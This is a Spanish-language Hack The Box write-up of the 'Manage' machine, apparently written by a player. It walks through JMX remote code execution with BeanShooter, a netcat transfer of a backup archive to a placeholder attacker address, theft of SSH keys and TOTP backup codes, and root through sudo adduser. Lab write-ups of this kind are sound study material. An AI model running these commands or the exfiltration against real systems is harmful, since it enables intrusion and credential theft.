# HTB - Manage Writeup

**Autor:** TRNNSK
**Dificultad:** Easy
**Sistema:** Linux

---

# Resumen

La máquina **Manage** presenta una cadena de vulnerabilidades que debemos escalar para llegar al control total de root. Vamos a explotar un servicio Java RMI/JMX expuesto sin autenticación para obtener RCE como `tomcat`, luego encontramos un backup archive mal configurado que expone las claves SSH y códigos OTP de `useradmin`, y finalmente abusamos de una misconfiguration de sudo que permite crear un usuario `admin` con privilegios completos de root.

---

# Enumeración

## Escaneo inicial

```bash
nmap -sC -sV 10.129.234.57
```

### Resultados:

```
22/tcp   open  ssh      OpenSSH 8.9p1
2222/tcp open  java-rmi Java RMI
8080/tcp open  http     Apache Tomcat 10.1.19
```

El escaneo revela tres servicios:
- **SSH** en el puerto 22
- **Java RMI** en el puerto 2222 con un servicio JMX (`jmxrmi`) expuesto sin autenticación
- **Apache Tomcat** en el puerto 8080 — la landing page por defecto sin nada de interés

---

# Foothold — JMX RCE via BeanShooter

## Identificación

El output de nmap muestra que el registro RMI es accesible y no requiere autenticación:

```
rmi-dumpregistry:
  jmxrmi
    javax.management.remote.rmi.RMIServerImpl_Stub
    @127.0.1.1:38817
```

JMX (Java Management Extensions) sin autenticación permite desplegar MBeans maliciosos para obtener RCE.

## Enumeración con BeanShooter

```bash
git clone https://github.com/qtc-de/beanshooter
cd beanshooter
mvn package

java -jar beanshooter-4.1.0-jar-with-dependencies.jar enum 10.129.234.57 2222
```

La enumeración confirma:
- JMX accesible **sin autenticación**
- Credenciales hardcodeadas de Tomcat expuestas:
  - `manager:fhErvo2r9wuTEYiYgt`
  - `admin:onyRPCkaG4iX72BrRtKgbszd`

## Explotación

```bash
# Despliega el MBean malicioso
java -jar beanshooter-4.1.0-jar-with-dependencies.jar standard 10.129.234.57 2222 tonka

# Obtén shell interactiva
java -jar beanshooter-4.1.0-jar-with-dependencies.jar tonka shell 10.129.234.57 2222
```

Se obtiene shell como `tomcat`. Flag de usuario:

```bash
cat /opt/tomcat/user.txt
```

---

# Lateral Movement — tomcat → useradmin via Backup Archive

## Identificación

Enumerando el sistema se encuentran dos usuarios con home directories: `karl` y `useradmin`. El directorio de `useradmin` tiene permisos permisivos en la carpeta `backups`:

```bash
ls -la /home/useradmin
# drwxrwxr-x 2 useradmin useradmin 4096 backups  ← escribible por todos
# -r-------- 1 useradmin useradmin 200  .google_authenticator  ← OTP
# drwxrwxr-x 2 useradmin useradmin 4096 .ssh
```

La carpeta `backups` contiene un archivo `backup.tar.gz` legible.

## Explotación

Se transfiere el backup a la máquina atacante:

```bash
# En Kali — listener
nc -lvp 1234 > backup.tar.gz

# Desde shell tomcat
nc TU_IP 1234 < /home/useradmin/backups/backup.tar.gz
```

Se extrae el backup:

```bash
tar -xvzf backup.tar.gz
```

El backup contiene el home completo de `useradmin` incluyendo:
- `.ssh/id_ed25519` — clave privada SSH
- `.google_authenticator` — secreto TOTP y **10 códigos de backup de un solo uso**

## Acceso SSH con OTP

```bash
ssh useradmin@10.129.234.57 -i .ssh/id_ed25519
```

El servidor pide verificación en dos pasos. Se usa uno de los códigos de backup del `.google_authenticator`:

```
99852083  (o cualquiera de los 10 disponibles)
```

Se obtiene acceso como `useradmin`.

---

# Escalada de Privilegios — sudo adduser → root

## Identificación

```bash
sudo -l
```

### Resultado:

```
User useradmin may run the following commands on manage:
    (ALL : ALL) NOPASSWD: /usr/sbin/adduser ^[a-zA-Z0-9]+$
```

`useradmin` puede ejecutar `adduser` como root sin contraseña con cualquier nombre alfanumérico.

## Explotación

En Ubuntu, el grupo `admin` tiene permisos completos de sudo por defecto. Si no existe un usuario `admin` en el sistema, crearlo con `adduser` lo agrega automáticamente al grupo `admin`.

```bash
# Crea el usuario admin — se agrega automáticamente al grupo admin
sudo /usr/sbin/adduser admin
# Introduce una contraseña simple cuando la pida
```

```bash
# Cambia al usuario admin recién creado
su admin

# Obtén shell root
sudo su
```

---

# Obtener la Flag

```bash
cat /root/root.txt
```

---

# TLDR MUCHO TEXTO

1. Escanear con Nmap — encontrar Java RMI en puerto 2222 y Tomcat en 8080
2. Enumerar JMX con BeanShooter — confirmar acceso sin autenticación y credenciales Tomcat expuestas
3. Desplegar MBean malicioso con BeanShooter para obtener shell como `tomcat`
4. Enumerar el sistema — encontrar backup archive legible en `/home/useradmin/backups/`
5. Transferir el backup via netcat y extraerlo
6. Obtener clave SSH y códigos OTP de backup del `.google_authenticator`
7. SSH como `useradmin` usando la clave privada y un código OTP de backup
8. Identificar sudo sobre `adduser` sin contraseña
9. Crear usuario `admin` — Ubuntu lo agrega automáticamente al grupo admin
10. `su admin` → `sudo su` → root

---

# Conclusión

Esta máquina demuestra cómo:

- Un servicio JMX expuesto sin autenticación permite desplegar MBeans maliciosos y obtener RCE completo
- Los backups con permisos demasiado permisivos pueden exponer archivos sensibles como claves SSH y secretos OTP
- Los códigos de backup de Google Authenticator son tan valiosos como la contraseña misma y no deben incluirse en backups
- Una misconfiguration de sudo que permite `adduser` sin restricciones de grupo puede llevar a root en sistemas Ubuntu que crean automáticamente el grupo `admin`

---

y ya
